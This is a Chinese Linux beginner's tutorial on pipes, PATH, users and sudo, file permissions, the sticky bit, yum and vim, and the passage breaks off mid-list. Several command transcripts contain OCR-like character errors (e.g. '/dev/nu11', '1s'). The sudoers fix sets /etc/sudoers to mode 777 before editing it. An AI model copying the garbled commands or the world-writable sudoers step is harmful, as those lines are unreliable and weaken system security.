title="&#x2F;dev&#x2F;null"></a>&#x2F;dev&#x2F;null</h4><p>垃圾桶黑洞设备，如果我知道有错误信息，但是我不想要，我想凡是错误信息直接丢弃，习惯写法是</p><pre><code>[whb@vM-O-3-centos test]$ find /home -name test.c 2&gt;/dev/nu11#便只显示正常信息了/home/wudu/work/linux-57/linux-lesson7/signal_test/test.c/home/wudu/work/1inux-57/linux-lesson7/sigaction_test/test.c/ home/wudu/work/linux-57/linux-1esson7/sigmask/test.c/home/wudu/work/ linux-57/linux-1esson15/test/test.c/home/wudu/work/linux-57/1inux-lesson4/pipesize/test.c/home/wudu/work/linux-57/linux-1esson5/testmkfifo/test.c...</code></pre><h3 id="Linux管道命令的理解和操作"><a href="#Linux管道命令的理解和操作" class="headerlink" title="Linux管道命令的理解和操作"></a>Linux管道命令的理解和操作</h3><p>命令是可以产生数据的，如果我们还要多输出数据进行加工，甚至想多次加工，就需要使用管道</p><pre><code>[root@localhost ~]# last #显示正在或者最近登陆linux的用户信息root     pts/0        192.168.174.1    Tue Oct 31 06:45   still logged in   root     pts/1        192.168.174.1    Tue Oct 31 06:34 - 06:45  (00:11)    root     pts/0        192.168.174.1    Tue Oct 31 04:51 - 06:34  (01:43)    (unknown :0           :0               Tue Oct 31 04:50   still logged in   reboot   system boot  3.10.0-514.el7.x Tue Oct 31 04:49 - 09:06  (04:16)    root     pts/0        192.168.174.1    Mon Oct 30 20:01 - crash  (08:48)    (unknown :0           :0               Mon Oct 30 20:00 - crash  (08:49)    reboot   system boot  3.10.0-514.el7.x Mon Oct 30 20:00 - 09:06  (13:05) ...#如果我只想看到5条信息呢 [root@localhost ~]# last | head -5 #其中&quot;|&quot;就是管道,head时一个获取文本行的工具,可以单独介绍root     pts/0        192.168.174.1    Tue Oct 31 06:45   still logged in   root     pts/1        192.168.174.1    Tue Oct 31 06:34 - 06:45  (00:11)    root     pts/0        192.168.174.1    Tue Oct 31 04:51 - 06:34  (01:43)    (unknown :0           :0               Tue Oct 31 04:50   still logged in   reboot   system boot  3.10.0-514.el7.x Tue Oct 31 04:49 - 09:07  (04:17) ...#如果我只想看到我(root)的登陆历史信息呢?[root@localhost ~]# last | grep &quot;root&quot;root     pts/0        192.168.174.1    Tue Oct 31 06:45   still logged in   root     pts/1        192.168.174.1    Tue Oct 31 06:34 - 06:45  (00:11)    root     pts/0        192.168.174.1    Tue Oct 31 04:51 - 06:34  (01:43)    root     pts/0        192.168.174.1    Mon Oct 30 20:01 - crash  (08:48)    root     pts/1        192.168.174.1    Tue Oct 24 04:38 - 04:38  (00:00)    root     pts/0        :0               Tue Oct 24 04:30 - 04:39  (00:08)    root     :0           :0               Tue Oct 24 04:30 - 04:39  (00:08)...#如果我只想看到我的历史登陆时间?要用到awk[root@localhost ~]# last | grep &quot;root&quot; | awk &#39;&#123;print $1,$4,$5,$6,$7&#125;&#39;root Tue Oct 31 06:45root Tue Oct 31 06:34root Tue Oct 31 04:51root Mon Oct 30 20:01root Tue Oct 24 04:38root Tue Oct 24 04:30root Tue Oct 24 04:30root Mon Oct 23 19:08root Tue Jul 25 01:33root Tue Jul 25 01:32root Tue Jul 25 01:14root Tue Jul 25 01:14root Tue Jul 25 01:09root Tue Nov 16 21:07</code></pre><p>可见，管道是可以级联多条命令的，每条命令的结果输出，都作为输入，导入下一条命令。有点像流水线</p><p><img src="/../image/image-20231101001146154.png" alt="image-20231101001146154"></p><p>理论上，管道的基本操作就完了，实际上，如果站在日常使用就够了，但是如果想面试大厂，至少有两方面问题需要深究?</p><ul><li>除了上面的文本处理工具，还有哪些文本处理工具你都使用过，各自有什么特征?·</li><li>站在操作系统层面，管道的底层原理是什么?</li></ul><h3 id="Linux环境变量与PATH"><a href="#Linux环境变量与PATH" class="headerlink" title="Linux环境变量与PATH"></a>Linux环境变量与PATH</h3><p>假设我们用c写一个输出hello world!的程序</p><pre><code>[root@localhost ~]# cat test.c#include&lt;stdio.h&gt;int main()&#123;    printf(&quot;hello world\n&quot;);    return 0;&#125;[root@localhost ~]# gcc -o mycmd test.c[root@localhost ~]# ./mycmdhello world#./也可以认为是一种命令#想ls,就在/bin/ls or/usr/bin/ls,为什么执行的时候可以不带路径呢</code></pre><p>环境变量PATH<br>是一个路径集，命令再被执行时，系统会在环境变量PATH中进行路径查找，如果找到，就停止查找，执行命令。</p><pre><code>[root@localhost ~]# echo $PATH #不同环境,平台的内容可能不同/usr/local/soft/java/jdk1.8.0_40/bin:/usr/local/soft/java/jdk1.8.0_40/jre/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin$:用来显示PATH环境变量的内容#各个路径以:作为分隔符,每个区域代表一个搜索路径</code></pre><p>这也就解释了，为何ls不需要带路径，因为ls所在的路径，本身就在PATH环境变量列表当中。</p><pre><code>[root@localhost ~]# which lsalias ls=&#39;ls --color=auto&#39;    /usr/bin/ls</code></pre><p>那么问题来了，我也想让我的’hello world’程序执行的时候不带.&#x2F;这样的路径,怎么办呢?</p><pre><code>#方法一[whb@vM-O-3-centos test]$ mycmd-bash: mycmd: command not found[whb@vM-O-3-centos test]$ sudo cp mycmd /usr/bin[sudo] password for whb:[whb@vM-O-3-centos test]$ 1s /usr/bin/mycmd/usr/bin/mycmd[whb@VM-O-3-centos test]$ mycmd#但是千万不要这样干，因为会‘污染&#39;指令集he1lo wor1d#方法二[whb@vM-O-3-centos test]$ echo $PATH/usr/loca1/jdk8/bin:/usr/loca1/jdk8/jre/bin:/usr/loca1/bin:/usr/bin: [usr/Toca1/sbin:/usr/sbin : /home/whb / .1oca1/bin : /home/whb/bin[whb@vM-O-3-centos test]$ pwd#查看自己当前处于哪个目录/home/whb/test[whb@VM-0-3-centos test]s export PATH=$PATH:/home/whb/test#导出新的环境变量，加上程序所在的路径[whb@vM-0-3-centos test]$ echo $PATH/usr/loca1/jdk8/bin:/usr/local/jdk8/jre/bin;/eseloca1/bin:/usr/bin:/usr/local/sbin:/usr/sbin : /home/whb / .loca1/bin:/home/whb/bin : / home/vwhb/tes t[whb@vM-O-3-centos test]$ sudo rm /usr/bin/mycmd#删掉在/usr/bin路径下的可执行程序[whb@vM-O-3-centos test]$ which myemd #mycmdt经能通过环境变量被找到~/test/mycmd[whb@vM-0-3-centos test]$ mycmd就可以不带路径he1lo wor1d</code></pre><p>我们在思考一下，几乎可以得出如下结论;</p><ul><li>系统本身会提供某种全局育找属性，帮我们找到特定的模块&#x2F;程序</li></ul><p>其实，编译器内部也有类似的功能，想想，为何我们#includec头文件&gt;,并没有指明头文件在哪里，但是编译器也能帮我们找到并展开，包括我们也并没有指明我们的程序依赖哪些第三方库，编译器也能找到。</p><h3 id="插话-vim编辑器里Tab键缩进不是4个空格怎么调"><a href="#插话-vim编辑器里Tab键缩进不是4个空格怎么调" class="headerlink" title="插话,vim编辑器里Tab键缩进不是4个空格怎么调"></a>插话,vim编辑器里Tab键缩进不是4个空格怎么调</h3><ul><li><p>第一步,找到vimrc文件所在位置</p><pre><code># find / -name vimrc</code></pre></li><li><p>第二步: 找到以后用vim打开vimrc文件并增加下面两行代码</p><pre><code>set ts=4set expandtab</code></pre><p>加在set ruler或即可</p><p><img src="/../image/image-20231101002709400.png" alt="image-20231101002709400"></p></li></ul><h2 id="Linux权限理解"><a href="#Linux权限理解" class="headerlink" title="Linux权限理解"></a>Linux权限理解</h2><p><a href="https://blog.csdn.net/ghjzzhg/article/details/94388439">linux中&#x2F;etc&#x2F;pam.d&#x2F;system-auth文件详解</a>该文件可以用来限制密码强度，输入次数等，可提高安全性</p><h3 id="Linux用户的概念"><a href="#Linux用户的概念" class="headerlink" title="Linux用户的概念"></a>Linux用户的概念</h3><h4 id="Linux下有两种用户：超级用户（root）、普通用户"><a href="#Linux下有两种用户：超级用户（root）、普通用户" class="headerlink" title="Linux下有两种用户：超级用户（root）、普通用户"></a>Linux下有两种用户：超级用户（root）、普通用户</h4><ul><li>超级用户:可以再linux系统下做任何事情，不受限制</li><li>普通用户:在linux下做有限的事情。</li><li>超级用户的命令提示符是”#”，普通用户的命令提示符是”$”。</li></ul><h3 id="角色切换"><a href="#角色切换" class="headerlink" title="角色切换"></a>角色切换</h3><h4 id="普通用户切换超级用户"><a href="#普通用户切换超级用户" class="headerlink" title="普通用户切换超级用户"></a>普通用户切换超级用户</h4><pre><code>[youzipii@localhost ~]$ whoamiyouzipii[youzipii@localhost ~]$ sudo -s[sudo] password for youzipii: [root@localhost youzipii]# whoamiroot[root@localhost youzipii]# </code></pre><h4 id="超级用户切换到普通用户"><a href="#超级用户切换到普通用户" class="headerlink" title="超级用户切换到普通用户"></a>超级用户切换到普通用户</h4><pre><code>[youzipii@localhost ~]$ sudo -s[root@localhost youzipii]# whoamiroot[root@localhost youzipii]# exitexit[youzipii@localhost ~]$ whoamiyouzipii</code></pre><h4 id="怎么查看当前linux有多少用户-好文-https-www-cnblogs-com-will-wu-p-12937015-html"><a href="#怎么查看当前linux有多少用户-好文-https-www-cnblogs-com-will-wu-p-12937015-html" class="headerlink" title="怎么查看当前linux有多少用户[好文][https://www.cnblogs.com/will-wu/p/12937015.html]"></a>怎么查看当前linux有多少用户[好文][<a href="https://www.cnblogs.com/will-wu/p/12937015.html]">https://www.cnblogs.com/will-wu/p/12937015.html]</a></h4><pre><code>cat /etc/passwd | cut -f 1 -d :[youzipii@localhost ~]$ cat /etc/passwd | cut -f 1 -d:rootbindaemonadmlp...# 注：| 是管道，把cat的输出传给cut处理；后面的cut取出每一行的以：分割的第一栏[youzipii@localhost ~]$ cat /etc/passwdroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologin.../etc/passwd 文件存放的是用户信息.由六个分号组成的7个信息,分别是:用户名 （magesh）： 已创建用户的用户名，字符长度 1 个到 12 个字符。密码（x）：代表加密密码保存在 `/etc/shadow 文件中。用户 ID（506）：代表用户的 ID 号，每个用户都要有一个唯一的 ID 。UID 号为 0 的是为 root 用户保留的，UID 号 1 到 99 是为系统用户保留的，UID 号 100-999 是为系统账户和群组保留的。群组 ID （507）：代表群组的 ID 号，每个群组都要有一个唯一的 GID ，保存在 /etc/group文件中。用户信息（2g Admin - Magesh M）：代表描述字段，可以用来描述用户的信息（LCTT 译注：此处原文疑有误）。家目录（/home/mageshm）：代表用户的家目录。Shell（/bin/bash）：代表用户使用的 shell 类型。</code></pre><h4 id="报错-用户不在sudoers文件中"><a href="#报错-用户不在sudoers文件中" class="headerlink" title="报错(用户不在sudoers文件中)"></a>报错(用户不在sudoers文件中)</h4><p>在使用sudo -s命令时,出现以下情况</p><pre><code>youzipii is not in the sudoers file.  This incident will be reported.</code></pre><p>解决方法:</p><pre><code># 第一步先su - 进入root模式# 第二步再去修改/etc/sudoers里的内容,在root下面加入用户名,其他与root一致# 但文件权限可能不够,需要先给权限[root@localhost ~]# chmod 777 /etc/sudoers[root@localhost ~]# vi /etc/sudoers...## Allow root to run any commands anywhere root    ALL=(ALL)   ALLyouzipii ALL=(ALL)     ALL...[root@localhost ~]# chmod u-wx,o-wx,g-rwx /etc/sudoers</code></pre><p>另外，用户角色切换还有其他方式，还有很多细节.<br>还有，Linux是多用户的，所以可以同时登陆多人，甚至你可以切成别人的身份，但是目前我们的Linux机器，大都是自己使用，所以先不考虑这些。</p><h3 id="Linux权限管理"><a href="#Linux权限管理" class="headerlink" title="Linux权限管理"></a>Linux权限管理</h3><h4 id="文件访问者的分类"><a href="#文件访问者的分类" class="headerlink" title="文件访问者的分类"></a>文件访问者的分类</h4><ul><li>文件和文件目录的所有者:u—User</li><li>文件和文件目录的所有者所在的组的用户g—Group </li><li>其它用户:o—Others(外国人)</li></ul><h4 id="文件类型和访问权限（事务属性）"><a href="#文件类型和访问权限（事务属性）" class="headerlink" title="文件类型和访问权限（事务属性）"></a>文件类型和访问权限（事务属性）</h4><p><img src="/../image/image-20231101185252874.png" alt="image-20231101185252874"></p><h3 id="文件类型"><a href="#文件类型" class="headerlink" title="文件类型"></a>文件类型</h3><ul><li>d:文件夹-︰普通文件</li><li>1∶软链接（类似windows的快捷方式)</li><li>b:块设备文件（例如硬盘、光驱等)</li><li>p:管道文件</li><li>c:字符设备文件（例如屏幕等串口设备)</li><li>s:套接口文件</li></ul><h4 id="file指令"><a href="#file指令" class="headerlink" title="file指令"></a>file指令</h4><p>功能说明：辨识文件类型</p><p>语法：file [选项] 文件或目录</p><pre><code>[youzipii@localhost home]$ cd youzipii/[youzipii@localhost ~]$ file ../youzipii/../youzipii/: directory[youzipii@localhost ~]$ file youzipii.txtyouzipii.txt: empty[youzipii@localhost ~]$ echo &quot;www.baidu.com&quot; &gt;&gt; youzipii.txt[youzipii@localhost ~]$ file youzipii.txtyouzipii.txt: ASCII text</code></pre><h4 id="基本权限设置"><a href="#基本权限设置" class="headerlink" title="基本权限设置"></a>基本权限设置</h4><ul><li>读（r&#x2F;4) : Read对文件而言，具有读取文件内容的权限;对目录来说，具有浏览该目录信息的权限</li><li>写(w&#x2F;2) : Write对文件而言，具有修改文件内容的权限;对目录来说具有删除移动目录内文件的权限</li><li>执行(x&#x2F;1) : execute对文件而言，具有执行文件的权限;对目录来说，具有进入目录的权限</li><li>“—“表示不具有该项权限</li></ul><h4 id="文件权限值得表示方法"><a href="#文件权限值得表示方法" class="headerlink" title="文件权限值得表示方法"></a>文件权限值得表示方法</h4><p>字符表示方法</p><table><thead><tr><th>Linux表示</th><th>说明</th><th>Linux表示</th><th>说明</th></tr></thead><tbody><tr><td>r–</td><td>只读</td><td>-w-</td><td>仅可写</td></tr><tr><td>–x</td><td>仅可执行</td><td>rw-</td><td>读可写</td></tr><tr><td>-wx</td><td>可写和执行</td><td>r-x</td><td>可读可执行</td></tr><tr><td>rwx</td><td>可读可写可执行</td><td>—</td><td>无权限</td></tr></tbody></table><table><thead><tr><th>权限符号</th><th>八进制</th><th>二进制</th></tr></thead><tbody><tr><td>r</td><td>4</td><td>100</td></tr><tr><td>w</td><td>2</td><td>010</td></tr><tr><td>x</td><td>1</td><td>001</td></tr><tr><td>rw</td><td>6</td><td>110</td></tr><tr><td>rx</td><td>5</td><td>101</td></tr><tr><td>wx</td><td>3</td><td>011</td></tr><tr><td>rwx</td><td>7</td><td>111</td></tr><tr><td>—</td><td>0</td><td>000</td></tr></tbody></table><h4 id="文件权限访问得相关设置方法"><a href="#文件权限访问得相关设置方法" class="headerlink" title="文件权限访问得相关设置方法"></a>文件权限访问得相关设置方法</h4><h5 id="chmod功能：设置访问权限"><a href="#chmod功能：设置访问权限" class="headerlink" title="chmod功能：设置访问权限"></a>chmod功能：设置访问权限</h5><p>格式：chmod [参数] 权限 文件明</p><p>常用选项：</p><ul><li>R-&gt;递归修改目录文件的权限</li><li>说明:只有文件的拥有者和root才可以改变文件的权限</li></ul><p><em>chmod命令权限值的格式</em></p><p>① 用户表示符 +&#x2F;-&#x3D;权限字符</p><ul><li>+:向权限范围增加权限代号所表示的权限</li><li>-:向权限范围取消权限代号所表示的权限</li><li>&#x3D;:向权限范围赋予权限代号所表示的权限</li><li>用户符号:</li><li>u:拥有者</li><li>g:拥有者同组者</li><li>o:其它用户</li><li>a:所有用户</li></ul><p><strong>实例</strong></p><pre><code>[youzipii@localhost ~]$ lltotal 4-rw-rw-r--. 1 youzipii youzipii 14 Nov  1 04:04 youzipii.txt[youzipii@localhost ~]$ chmod u-rw,g-rw,o-r youzipii.txt[youzipii@localhost ~]$ lltotal 4----------. 1 youzipii youzipii 14 Nov  1 04:04 youzipii.txt[youzipii@localhost ~]$ chmod u+w,a=x youzipii.txt[youzipii@localhost ~]$ lltotal 4---x--x--x. 1 youzipii youzipii 14 Nov  1 04:04 youzipii.txt</code></pre><p>②三位8进制数字</p><p><strong>实例</strong></p><pre><code>[youzipii@localhost ~]$ chmod 000 youzipii.txt[youzipii@localhost ~]$ lltotal 4----------. 1 youzipii youzipii 14 Nov  1 04:04 youzipii.txt[youzipii@localhost ~]$ chmod 664 youzipii.txt[youzipii@localhost ~]$ lltotal 4-rw-rw-r--. 1 youzipii youzipii 14 Nov  1 04:04 youzipii.txt</code></pre><h5 id="chown功能：修改文件拥有者"><a href="#chown功能：修改文件拥有者" class="headerlink" title="chown功能：修改文件拥有者"></a>chown功能：修改文件拥有者</h5><p>格式：chown [参数] 用户名，文件名</p><p><strong>实例</strong></p><pre><code># chown user1 f1# chwon -R user1 filegroup1</code></pre><h5 id="chgrp功能：修文件或目录所属组"><a href="#chgrp功能：修文件或目录所属组" class="headerlink" title="chgrp功能：修文件或目录所属组"></a>chgrp功能：修文件或目录所属组</h5><p>格式：chgrp [参数] 用户组名 文件名</p><p>常用选项： -R 递归修改文件或目录所属组</p><p><strong>实例</strong></p><pre><code># chgrp users /abc/f2</code></pre><h5 id="使用sudo分配权限"><a href="#使用sudo分配权限" class="headerlink" title="使用sudo分配权限"></a>使用sudo分配权限</h5><p>（1） 修改&#x2F;etc&#x2F;sudoers文件分配文件</p><pre><code>chmod 740 /etc/sudoersvi /etc/sudoer</code></pre><p>（2） 使用sudo调用授权命令</p><pre><code>[youzipii@localhost ~]$ whoamiyouzipii[youzipii@localhost ~]$ sudo -u root whoamiroot...or...[youzipii@localhost ~]$ whoamiyouzipii[sudo] password for youzipii:[youzipii@localhost ~]$ sudo whoamiroot</code></pre><h3 id="目录权限"><a href="#目录权限" class="headerlink" title="目录权限"></a>目录权限</h3><ul><li>可执行权限:如果目录没有可执行权限,则无法cd到目录中.</li><li>可读权限:如果目录没有可读权限,则无法用ls等命令查看目录中的文件内容.</li><li>可写权限:如果目录没有可写权限,则无法在目录中创建文件,也无法在目录中删除文件.</li></ul><p>换句话来讲,就是只要用户具有目录的写权限,用户就可以删除目录中的文件,而不论这个用户是否有这个文件的写权限.<br>这好像不太科学啊,我张三创建的一个文件,凭什么被你李四可以删掉?我们用下面的过程印证一下.</p><pre><code>[youzipii@localhost ~]$ sudo chmod 777 fortest[youzipii@localhost ~]$ lltotal 4drwxrwxrwx. 2 root  root      6 Nov  1 04:38 fortest-rw-rw-r--. 1 user1 youzipii 14 Nov  1 04:04 youzipii.txt[youzipii@localhost ~]$ ls -ld fortest/drwxrwxrwx. 2 root root 6 Nov  1 04:38 fortest/[youzipii@localhost ~]$ cd fortest/[youzipii@localhost fortest]$ touch test.c[youzipii@localhost fortest]$ lltotal 0-rw-rw-r--. 1 youzipii youzipii 0 Nov  1 04:41 test.c[youzipii@localhost fortest]$ sudo touch test_root.c[youzipii@localhost fortest]$ lltotal 0-rw-rw-r--. 1 youzipii youzipii 0 Nov  1 04:41 test.c #普通用户-rw-r--r--. 1 root     root     0 Nov  1 04:41 test_root.c #超级用户[youzipii@localhost fortest]$ whoamiyouzipii[youzipii@localhost fortest]$ rm test_root.crm: remove write-protected regular empty file ‘test_root.c’? y[youzipii@localhost fortest]$ lltotal 0-rw-rw-r--. 1 youzipii youzipii 0 Nov  1 04:41 test.c #删除成功</code></pre><p>为了解决这个问题，Linux引入了粘滞位</p><h4 id="粘滞位-好文-https-blog-csdn-net-better1914-article-details-53943081"><a href="#粘滞位-好文-https-blog-csdn-net-better1914-article-details-53943081" class="headerlink" title="粘滞位[好文][https://blog.csdn.net/better1914/article/details/53943081]"></a>粘滞位[好文][<a href="https://blog.csdn.net/better1914/article/details/53943081]">https://blog.csdn.net/better1914/article/details/53943081]</a></h4><p>粘滞位（Stickybit），或粘着位。最常见的用法在目录上设置粘滞位，如此以来，只有目录内文件的所有者或者root才可以删除或移动该文件。如果不为目录设置粘滞位，任何具有该目录写和执行权限的用户都可以删除和移动其中的文件。在我们系统中，粘滞位一般用于&#x2F;tmp目录，以防止普通用户删除或移动其他用户的文件。<br>一个目录具有粘滞位，则在other的X位会表现为 t,或者T.大小写的区别在于，原来x位上有x权限，有了粘滞位则表现为t.否则，表现为T。</p><pre><code>[youzipii@localhost /]$ ls -ld /tmpdrwxrwxrwt. 30 root root 4096 Nov  1 04:04 /tmp</code></pre><p><em>删除用户是最好带上-r不然用户的home目录不会一起删除</em></p><h3 id="关于目录权限总结"><a href="#关于目录权限总结" class="headerlink" title="关于目录权限总结"></a>关于目录权限总结</h3><ul><li>目录的可执行权限是表示你可否在目录下执行命令。</li><li>如果目录没有-x权限，则无法对目录执行任何命令，甚至无法cd进入目,即使目录仍然有-r读权限（这个地方很容易犯错，认为有读权限就可以进入目录读取目录下的文件)</li><li>而如果目录具有-x权限，但没有-权限，则用户可以执行命令，可以cd进入目录。但由于没有目录的读权限</li><li>所以在目录下，即使可以执行ls命令，但仍然没有权限读出目录下的文档。</li></ul><h2 id="Linux软件包管理yum"><a href="#Linux软件包管理yum" class="headerlink" title="Linux软件包管理yum"></a>Linux软件包管理yum</h2><h3 id="什么时软件包"><a href="#什么时软件包" class="headerlink" title="什么时软件包"></a>什么时软件包</h3><ul><li>在Linux下安装软件,一个通常的办法是下载到程序的源代码,并进行编译,得到可执行程序.</li><li>但是这样太麻烦了，于是有些人把一些常用的软件提前编译好,做成软件包(可以理解成windows上的安装程序)放在一个服务器上,通过包管理器可以很方便的获取到这个编译好的软件包,直接进行安装.</li><li>软件包和软件包管理器,就好比”App”和”应用商店”这样的关系.</li><li>yum(Yellow dog Updater, Modified)是Linux下非常常用的一种包管理器.主要应用在Fedora, RedHat,Centos等发行版上.</li></ul><h3 id="关于rzsz"><a href="#关于rzsz" class="headerlink" title="关于rzsz"></a>关于rzsz</h3><p>这个工具用于windows机器和远端的Linux机器通过XShell传输文件.安装完毕之后可以通过拖拽的方式将文件上传过去.</p><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>关于yum的所有操作必须保证主机(虚拟机)网络畅通!可以通过 ping 指令验证</p><pre><code>ping baidu.com</code></pre><p>ping命令是一个用来进行检测网络连通性的命令，我们目前主要会用就行，如果你不知道自己的主机有没有联网，可以试试ping</p><pre><code>[youzipii@localhost yum.repos.d]$ ping baidu.com -c 4PING baidu.com (110.242.68.66) 56(84) bytes of data.64 bytes from 110.242.68.66 (110.242.68.66): icmp_seq=1 ttl=128 time=56.8 ms64 bytes from 110.242.68.66 (110.242.68.66): icmp_seq=2 ttl=128 time=56.2 ms64 bytes from 110.242.68.66 (110.242.68.66): icmp_seq=3 ttl=128 time=57.3 ms64 bytes from 110.242.68.66 (110.242.68.66): icmp_seq=4 ttl=128 time=56.1 ms--- baidu.com ping statistics ---4 packets transmitted, 4 received, 0% packet loss, time 3004msrtt min/avg/max/mdev = 56.184/56.664/57.344/0.561 ms</code></pre><h3 id="查看软件包"><a href="#查看软件包" class="headerlink" title="查看软件包"></a>查看软件包</h3><p>通过yum list 命令可以罗列出当前一共有哪些软件包.由于包的数目可能非常之多，这里我们需要使用grep命令只筛选出我们关注的包.例如:</p><pre><code>[youzipii@localhost yum.repos.d]$ yum list | grep lrzszlrzsz.x86_64                                0.12.20-36.el7             @anaconda</code></pre><h4 id="注意事项-1"><a href="#注意事项-1" class="headerlink" title="注意事项"></a>注意事项</h4><ul><li>软件包名称:主版本号.次版本号.源程序发行号-软件包的发行号.主机平台.cpu架构.</li><li>“x86_64”后缀表示64位系统的安装包, “i686”后缀表示32位系统安装包.选择包时要和系统匹配.”el7”表示操作系统发行版的版本.</li><li>“el7”表示的是centos7&#x2F;redhat7. “el6”表示centos6&#x2F;redhat6.</li><li>最后一列, base 表示的是”软件源”的名称,类似于”小米应用商店”,”华为应用商店”这样的概念.</li></ul><h3 id="如何安装软件"><a href="#如何安装软件" class="headerlink" title="如何安装软件"></a>如何安装软件</h3><p>通过yum,我们可以通过很简单的一条命令完成gcc的安装.</p><pre><code>sudo yum install lrzsz</code></pre><p>yum 会自动找到都有哪些软件包需要下载,这时候敲”y”确认安装.出现”complete”字样,说明安装完成.</p><h4 id="注意事项-2"><a href="#注意事项-2" class="headerlink" title="注意事项"></a>注意事项</h4><ul><li>安装软件时由于需要向系统目录中写入内容，一般需要会do或者切到rool账户下才能完成.</li><li>yum安装软件只能一个装完了再装另一个.正在yum安装一个软件的过程中,如果再尝试用yum安装另外-个软件, yum会报错.</li></ul><h3 id="如何卸载软件"><a href="#如何卸载软件" class="headerlink" title="如何卸载软件"></a>如何卸载软件</h3><p>仍然是一条命令:</p><pre><code>sudo yum remove lrzsz</code></pre><h3 id="换源-https-blog-csdn-net-xiaojin21cen-article-details-84726193"><a href="#换源-https-blog-csdn-net-xiaojin21cen-article-details-84726193" class="headerlink" title="[换源][https://blog.csdn.net/xiaojin21cen/article/details/84726193]"></a>[换源][<a href="https://blog.csdn.net/xiaojin21cen/article/details/84726193]">https://blog.csdn.net/xiaojin21cen/article/details/84726193]</a></h3><h2 id="vim与gcc使用"><a href="#vim与gcc使用" class="headerlink" title="vim与gcc使用"></a>vim与gcc使用</h2><p><img src="https://www.runoob.com/wp-content/uploads/2015/10/vi-vim-cheat-sheet-sch.gif" alt="img"></p><h3 id="vi-x2F-vim区别"><a href="#vi-x2F-vim区别" class="headerlink" title="vi&#x2F;vim区别"></a>vi&#x2F;vim区别</h3><p>vilvim的区别简单点来说，它们都是多模式编辑器，不同的是vim是vi的升级版本，它不仅兼容vi的所有指令，而且还有一些新的特性在里面。例如语法加亮，可视化操作不仅可以在终端运行，也可以运行于x window、mac os、windows。我们课堂上，统一按照vim来进行讲解。</p><h3 id="vim基本概念"><a href="#vim基本概念" class="headerlink" title="vim基本概念"></a>vim基本概念</h3><p>课堂上我们讲解vim的三种模式(其实有好多模式，目前掌握这3种即可),分别是命令模式(command mode)、插入模式(Insert mode)和底行模式弋(last line mode)，各模式的功能区分如下:</p><ul><li>正常&#x2F;普通&#x2F;命令模式(Normal mode)</li></ul><p><em>控制屏幕光标的移动，字符、字或行的删除，移动复制某区段及进入Insert mode下，或者到last line mode</em>·</p><ul><li>插入模式(Insert mode)</li></ul><p><em>只有在Insert mode下，才可以做文字输入，按「ESC」键可回到命令行模式。该模式是我们后面用的最频繁的编辑模式。</em></p><ul><li>·末行模式(last line mode)</li></ul><p><em>文件保存或退出，也可以进行文件替换，找字符串，列出行号等操作。在命令模式下，shift+:即可进入该模式。要查看你的所有模式:打开vim，底行模式直接输入</em></p><pre><code>:help vim-modes</code></pre><p>我这里一共有12种模式:six BASIC modes和six ADDITIONAL modes.</p><h3 id="vim基本操作"><a href="#vim基本操作" class="headerlink" title="vim基本操作"></a>vim基本操作</h3><ul><li><p>进入vim,在系统提示符号输入vim及文件名称后，就进入vim全屏幕编辑画面;</p><ul><li>$ vim test.c</li><li>不过有一点要特别注意，就是你进入vim之后，是处于[正常模式]，你要切换到[插入模式]才能够输入文字。</li></ul></li><li><p>[正常模式]切换至[插入模式]</p><ul><li>输入a 光标后移</li><li>输入i 不变</li><li>输入o 新起一行</li><li>输入s 但会删除当前光标所在的一个元素</li></ul></li><li><p>[插入模式]切换至[正常模式]</p><ul><li>目前处于[插入模式]，就只能一直输入文字，如果发现输错了字,想用光标键往回移动，将该字删除，可以先按一下「ESC」键转到[正常模式]再删除文字。当然，也可以直接删除。</li></ul></li><li><p>[正常模式]切换至[末行模式][shift +;」，其实就是输入「:」 退出vim及保存文件,在[正常模式]下，按一下「:」冒号键进入「Last line mode],例如:</p><ul><li>: w(保存当前文件)</li><li>: wq(输入「wq」,存盘并退出vim)</li><li>:q!(输入q!,不存盘强制退出vim)</li></ul></li></ul><h3 id="vim正常模式命令集（重要）"><a href="#vim正常模式命令集（重要）" class="headerlink" title="vim正常模式命令集（重要）"></a>vim正常模式命令集（重要）</h3><ul><li><p>插入模式</p><ul><li>·按「i」切换进入插入模式「insert mode]按”井入插入模式后是从光标当前位置开始输入文件;[重<br>要]</li><li>·按「a」进入插入模式后，是从目前光标d在位置的下一个位置开始输入文字;</li><li>·按「o」进入插入模式后，是括入新的一行，从行首开始输入文字。</li></ul></li><li><p>从插入模式切换为命令模式</p><ul><li>按「ESC」键。〔[重要]</li></ul></li><li><p>移动光标</p><ul><li>vim可以直接用键盘上的光标来上下左右移动，但正规的vim是用小写英文字母[h]、 [j]、 [k] 、[l]，分别控制光标左、下、上、右移一格</li><li>按[G]:移动到文章的最后〔重要]</li><li>按[$]:移动到光标所在行的”行尾”[重要]</li><li>按[^]:移动到光标所在行的“行首”[重要]</li><li>按[w]:光标跳到下个字的开头〔重要</li><li>按[e]:光标跳到下个字的字尾</li><li>按[b]︰光标回到上个字的开头[重要]</li><li>按[#]︰光标移到该行的第#个位置，如:5l,56l</li><li>按[gg]:进入到文本开始〔[重要]</li><li>按[shift+g]︰进入文本末端</li><li>按[ctrl]+[b]︰屏幕往”后”移动一页</li><li>按[ctrl]+ [f]︰屏幕往”前“移动一页</li><li>按[ctrl]+ [u]︰屏幕往”后”移动半页·</li><li>按[ctrl] + [d]︰屏幕往”前”移动半页</li></ul></li><li><p>删除文字</p><ul><li><p>.[x] : 每按一次，删除光标所在位置的一个字符〔重要]</p></li><li><p>[#x]︰例如，[6x]表示删除光标所在位置的”后面（包含自己在内)”6个字符</p></li><li><p>.[X] 大写的X，每按一次，删除光标所在位置的“前面”一个字符</p></li><li><p>.[#X]︰例如，[20X]表示删除光标所在位置的“前面”20个字符</p></li><li><p>.[dd]:删除光标所在行[重要]</p></li><li><p>[#dd] :从光标所在行开始删除#行[重要]</p></li><li><p>[yw]︰将光标所在之处到字尾的字符复制到缓冲区中。</p></li><li><p>.[#yw]:复制#个字到缓冲区</p></li><li><p>.[yy]:复制光标所在行到缓冲区。[重要]</p></li><li><p>.[#yy」 